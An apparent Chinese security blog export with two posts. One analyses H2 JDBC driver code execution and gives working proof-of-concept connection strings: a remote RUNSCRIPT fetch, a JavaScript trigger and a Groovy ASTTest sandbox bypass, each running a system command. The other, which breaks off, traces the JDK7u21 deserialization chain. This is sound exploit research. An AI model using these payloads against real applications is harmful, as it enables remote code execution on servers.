    <url>/2025/08/15/H2-JDBC-Attack/</url>
    <content><![CDATA[<h1 id="pdg3I">H2-JDBC-Attack</h1>
<h2 id="BMzNu">前言</h2>

<p>最近看了看了一些数据库驱动，想起来经常利用的H2数据库的驱动，但是还没分析过源码，所以今天来浅析一下</p>
<h2 id="IB5SS">漏洞介绍</h2>

<p>H2数据库是一款用Java编写的轻量级开源关系型数据库，支持嵌入式和服务器模式。它以其高性能、便捷性和灵活性，广泛应用于开发和测试环境。 h2数据库是纯Java的，因此跨平台使用更加方便。  </p>
<p>在使用 H2 数据库进行 JDBC 连接时，攻击者可以在执行初始化SQL语句时，控制执行 Java 代码，从而导致了代码执行漏洞。</p>
<h2 id="qHwg3">前置基础</h2>
<h3 id="KfZyI">环境搭建</h3>

<p>从官网<a href="https://www.h2database.com/html/cheatSheet.html">https://www.h2database.com/html/cheatSheet.html</a>下载h2的jar包，使用如下命令启动WebConsole服务，默认监听8082端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp h2-1.4.200.jar org.h2.tools.Server -web -webAllowOthers -ifNotExists</span><br></pre></td></tr></table></figure>

<p>启动后访问，会出现一个连接的页面</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755241013648-89ec32f8-3a92-44d8-8392-0be10a98d354.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755241013648-89ec32f8-3a92-44d8-8392-0be10a98d354.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="sJWCh">h2数据库任意命令执行</h3>

<p>在H2数据库中，有以下两个命令，支持用户自定义函数：</p>
<ul>
<li>CREATE ALIAS</li>
<li>CREATE TRIGGER</li>
</ul>
<p>以ALIAS为例，我们可以创建一个shell函数，并且调用它</p>
<p><code>$$</code>符号可以表示无需转义的字符串</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS shell <span class="keyword">AS</span> $$void shell(String s) throws Exception &#123;</span><br><span class="line">java.lang.Runtime.getRuntime().<span class="keyword">exec</span>(s);</span><br><span class="line">&#125;$$;</span><br><span class="line"><span class="keyword">SELECT</span> shell(<span class="string">&#x27;cmd /c calc.exe&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>执行后成功弹出计算机</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755241709163-58306976-dcb0-42f5-a3a4-b860e2040492.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755241709163-58306976-dcb0-42f5-a3a4-b860e2040492.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="b0Yf9">代码分析</h2>
<h3 id="OuhrW">环境搭建</h3>

<p>首先创建一个Java项目，导入H2JDBC的依赖，这里我使用的是<code>1.4.199</code>版本</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.h2database<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>h2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.199<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后创建漏洞触发代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2Connect</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;org.h2.Driver&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">simplexp</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test&quot;</span>;</span><br><span class="line">        java.sql.<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(simplexp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="X1sln">代码分析</h3>
我们直接下断点到H2驱动的`connect`方法处，前面先判断URL格式是否符合h2数据库连接的格式，然后调用`JdbcConnection`的构造函数进行创建数据库连接

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755227935438-2d11acd1-6759-4fed-942c-3dd6d5e83b44.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755227935438-2d11acd1-6759-4fed-942c-3dd6d5e83b44.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>JdbcConnection</code>的构造函数，调用了<code>connectEmbeddedOrServer</code>，其他部分做了一些判断和赋值的简单操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228213696-2f1146be-12e2-40c6-a2ac-d6e8161489db.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228213696-2f1146be-12e2-40c6-a2ac-d6e8161489db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228347105-ab9e0993-8197-406e-80b4-57d44c44b510.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228347105-ab9e0993-8197-406e-80b4-57d44c44b510.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>connectEmbeddedOrServer</code>方法，这里调用了<code>org.h2.engine.Engine.createSession</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228872145-a4fab2b6-4733-4ed0-93ec-53eae1540e3c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755228872145-a4fab2b6-4733-4ed0-93ec-53eae1540e3c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>createSession</code>，再跟进<code>createSessionAndValidate</code>方法，前面的东西不太需要看，我们只需要跟着传入的参数<code>var1</code>即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229005496-63a86dff-2eb9-4fdb-96cc-5d2ae6a5c9c0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229005496-63a86dff-2eb9-4fdb-96cc-5d2ae6a5c9c0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>openSession</code>中，会从我们的<code>ConnectionInfo</code>中获取以下四个参数，这里我们可以利用的参数为<code>INIT</code>，因此我们后面跟着var5参数即可</p>
<p>我们在URL中添加INIT参数<code>INIT=RUNSCRIPT FROM &#39;http://127.0.0.1:9999/poc.sql&#39;</code>，继续调试</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229236249-f50534d7-e446-40d6-8760-83d032518535.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229236249-f50534d7-e446-40d6-8760-83d032518535.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在后面会判断var5是否为空若不为空就执行<code>prepareCommand</code>和<code>executeUpdate</code>方法，这两个方法名一看见就有搞的哈哈哈哈</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229351170-48df3e04-7b1d-4816-8f7b-435582ec9d99.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755229351170-48df3e04-7b1d-4816-8f7b-435582ec9d99.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>repareCommand</code>方法中，执行了对字符串的解析操作，然后调用<code>executeUpdate</code>方法，我们跟进查看</p>
<p>解析完SQL字符串后，跟进到<code>Command#executeUpdate</code>方法，调用了<code>this.update</code>来执行SQL语句</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755230793457-9080ae19-06a2-4bc9-a1d7-b62162586c8b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755230793457-9080ae19-06a2-4bc9-a1d7-b62162586c8b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>持续跟进<code>update</code>方法，这里首先调用<code>openInput</code>方法，读取我们远程的SQL文件，然后逐行执行SQL语句</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755238775471-777d0fe8-09eb-4c9f-a376-7389609fac2a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755238775471-777d0fe8-09eb-4c9f-a376-7389609fac2a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>openInput</code>方法中，可以看到读取到了远程的文件名</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755238742298-0d9e4263-aa5b-49de-a8ff-8ed27e3f5ca5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755238742298-0d9e4263-aa5b-49de-a8ff-8ed27e3f5ca5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>跟进<code>execute</code>方法，这里已经读取到文件内容，并执行SQL语句</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755239078782-ecdce948-d0f3-41d7-92c2-23ef96dcc872.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755239078782-ecdce948-d0f3-41d7-92c2-23ef96dcc872.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="MZutg">漏洞利用</h2>
<h3 id="bpWvg">出网利用方式</h3>

<p>在INIT参数中，只允许执行一条初始化命令，且其中不能包含分号。这时我们可以借助另一个命令<code>RUNSCRIPT</code>，该命令通常用于执行一个SQL文件，例如<code>RUNSCRIPTE FROM &#39;./poc.sql&#39;</code>，在读取文件时，代码中使用了URL类，因此我们可以加载远程SQL文件。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> InputStream <span class="title function_">newInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">if</span> (name.matches(<span class="string">&quot;[a-zA-Z]&#123;2,19&#125;:.*&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// otherwise a URL is assumed</span></span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(name);</span><br><span class="line">    <span class="keyword">return</span> url.openStream();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(name);</span><br><span class="line">IOUtils.trace(<span class="string">&quot;openFileInputStream&quot;</span>, name, in);</span><br><span class="line"><span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Poc如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:h2:mem:test;INIT=RUNSCRIPT FROM <span class="string">&#x27;http://127.0.0.1:9999/poc.sql&#x27;</span></span><br></pre></td></tr></table></figure>

<p>将以下内容写入<code>poc.sql</code>中，并开启HTTP服务</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException&#123;Runtime.getRuntime().exec(cmd);return &quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">CALL</span> <span class="keyword">EXEC</span>(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755243366363-aef263ca-6501-46eb-a21e-cd230f46a1db.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755243366363-aef263ca-6501-46eb-a21e-cd230f46a1db.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="e1MeC">不出网利用方式</h3>

<p>在不出网的情况下，我们就无法利用远程读取SQL文件来执行恶意SQL语句了</p>
<h4 id="fwgEP">无额外依赖情况</h4>

<p>在没有groovy依赖的情况下，我们该怎么进行不出网的利用呢。</p>
<p>可以用于<code>javax.script.ScriptEngineManager</code>创建 <code>org.h2.api.Trigger</code> 对象。 <code>javax.script.ScriptEngineManager</code>是Java中用于执行脚本的引擎，而Java 8原 生自带了JavaScript的脚本引擎。</p>
<p>在<code>TriggerObject#loadFromSource</code>方法中，调用<code>isJavaxScriptSource</code>方法判断是否为javascript脚本。如果以<code>//javascript</code>或<code>#ruby</code>开头，就会被当作javascript脚本</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755245781347-60067bf5-17d0-4760-95c2-481ba424ad32.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755245781347-60067bf5-17d0-4760-95c2-481ba424ad32.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755245907981-a126794e-d33f-4204-97c1-eceeca324804.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755245907981-a126794e-d33f-4204-97c1-eceeca324804.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>poc如下（需要注意<code>//script</code>后需要有个换行）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON</span><br><span class="line">INFORMATION_SCHEMA.TABLES AS $$<span class="comment">//javascript</span></span><br><span class="line">java.lang.Runtime.getRuntime().exec(<span class="string">&#x27;cmd /c calc.exe&#x27;</span>)</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755246220565-2c6e8722-9362-4f6a-98cd-14ef76a12c02.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755246220565-2c6e8722-9362-4f6a-98cd-14ef76a12c02.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="sFnH3">存在Groovy依赖情况</h4>
在之前学习groovy脚本执行时，存在沙箱的情况下，我们可以使用AST注解绕过沙箱的检测，在导入`groovy-sql`依赖时，同样我们可以使用AST注解，进行H2JDBC不出网的利用

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.codehaus.groovy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-sql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>会根据是否以<code>//groovy</code>或<code>@groovy</code>开头，判断是否以groovy脚本执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755246427938-a7078c39-fba9-4b36-a650-7ee97cb36abe.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1755246427938-a7078c39-fba9-4b36-a650-7ee97cb36abe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>Poc如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS shell2 AS</span><br><span class="line">$$<span class="meta">@groovy</span>.transform.ASTTest(value=&#123;</span><br><span class="line">    <span class="keyword">assert</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;cmd.exe /c calc.exe&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">def x$$</span><br></pre></td></tr></table></figure>

<h2 id="BLqDq">小结</h2>
相比于之前学习的postgresql和mysql驱动的攻击，感觉H2 JDBC ATTACK的攻击点是利用了H2的语言特性，存在可以自定义函数的功能，导致了这个漏洞

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title>JDK7u21</title>
    <url>/2025/08/19/JDK7u21/</url>
    <content><![CDATA[<h1 id="A7qn1">JDK7u21</h1>
<h2 id="sO9xT">前言</h2>
好久之前的文章了，忘记发了

<h2 id="lYd5H">环境配置</h2>

<ul>
<li>只需JDK7u21</li>
</ul>
<h2 id="NfhLW">JDK7u21攻击链分析</h2>
<h3 id="gRDHZ">JDK7u21的核心</h3>
JDK7u21的核心点就是`sun.reflect.annotation.AnnotationInvocationHandler`

<p>我们可以看到<code>AnnotationInvocationHandler</code>中的<code>equalsImpl</code>方法</p>
<p>其中有一个明显的反射调用<code>memberMethod.invoke(o)</code>，而其中memberMethod来自<code>type.getDeclaredMethods()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object var1)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (var1 == <span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Method[] var2 = <span class="built_in">this</span>.getMemberMethods();</span><br><span class="line">            <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var2.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">var5</span> <span class="operator">=</span> var2[var4];</span><br><span class="line">                <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getName();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var6);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">AnnotationInvocationHandler</span> <span class="variable">var9</span> <span class="operator">=</span> <span class="built_in">this</span>.asOneOfUs(var1);</span><br><span class="line">                <span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    var8 = var9.memberValues.get(var6);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var8 = var5.invoke(var1);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(var12);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>也就是说这个<code>equalsImpl</code>方法遍历调用了<code>this.type</code>这个类中的所有方法，如果说这个类是一个Templates类，那么就会调用它的<code>newTransform()</code>和<code>getOutputproperties()</code>方法,进而触发任意代码执行。</p>
<h3 id="k236u">调用equalsImpl</h3>
这里把p神的解释拿过来

<blockquote>
<p>作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 __call ，我 </p>
<p>们需要用到 java.reflect.Proxy ： </p>
<p>Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我 </p>
<p>们需要代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具 </p>
<p>体代理的逻辑。 </p>
<p>… </p>
<p>我们回看 sun.reflect.annotation.AnnotationInvocationHandler ，会发现实际上这个类实 </p>
<p>际就是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时 </p>
<p>候，只要调用任意方法，就会进入到 AnnotationInvocationHandler#invoke 方法中，进而触发 </p>
<p>我们的 LazyMap#get 。 </p>
<p>十分美妙。</p>
</blockquote>
<p>在动态绑定一个接口时候，如果调用其任意方法，就会执行到<code>InvokationHandler#invoke</code>方法中。执行invoke方法时，第一个参数就是这个Proxy，第二个参数就是调用方法的名称，第三个参数就是执行方法时的参数列表</p>
<p>而我们找到了在的invoke方法中调用了equalsImpl方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; </span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果说我们调用了动态代理的invoke方法，且调用方法名为equals，参数有且只有一个时，才会进入if方法去执行equalsImpl方法，且参数为equals的仅一个参数</p>
<h3 id="OWuAr">找到equals方法调用链</h3>
有一个比较常见调用equals的地方就是集合set，在集合中不允许存在重复的对象，所以一定会存在比较的方法

<p>我们看一下<code>HashSet</code>的<code>readObject</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in HashMap capacity and load factor and create backing HashMap</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        map = (((HashSet)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in size</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里创建了一个HashMap，将对象放在HashMap的key的位置来去重</p>
<blockquote>
<p>HashMap，就是数据结构里的哈希表，相信上过数据结构课程的同学应该还记得，哈希表是由数组+链 </p>
<p>表实现的——哈希表底层保存在一个数组中，数组的索引由哈希表的 key.hashCode() 经过计算得到， </p>
<p>数组的值是一个链表，所有哈希碰撞到相同索引的key-value，都会被链接到这个链表后面。</p>
</blockquote>
<p>下面是HashMap的Put方法，这里掉用的equals方法非常符合我们想找的形式</p>
<p>想要触发<code>key.equals(k)</code>，我们需要让传入的两个key的hash相等时，才能走入同一个table内</p>
<p>我们最终想要触发<code>Proxy.equals(Templates)</code>，所以我们传入两个key就是Proxy和Templates</p>
<p>所以我们应该想办法，让Proxy和Templates的hash相等</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">                <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="ROf3R">巧用Magic Number</h3>
简化以后就是如下代码，计算哈希只看这两行代码就行

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line"><span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br></pre></td></tr></table></figure>

<p>关键函数提取出来后，可以得到以下函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    h ^= key.hashCode();</span><br><span class="line"></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    h = h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> h &amp; <span class="number">15</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>除了 key.hashCode() 外再没有其他变量，所以proxy对象与TemplateImpl对象的“哈希”是否相等，仅取决于这两个对象的 hashCode() 是否相等。TemplateImpl的 hashCode() 是一个Native方法，每次运行都会发生变化，我们理论上是无法预测的，所以想让proxy的 hashCode() 与之相等，只能寄希望于proxy.hashCode() 。</p>
</blockquote>
<p>若proxy调用<code>hashCode</code>，那么就会调用到<code>AnnotationInvocationHandler#invoke</code>方法，进而调用<code>hashCodeImpl</code>方法</p>
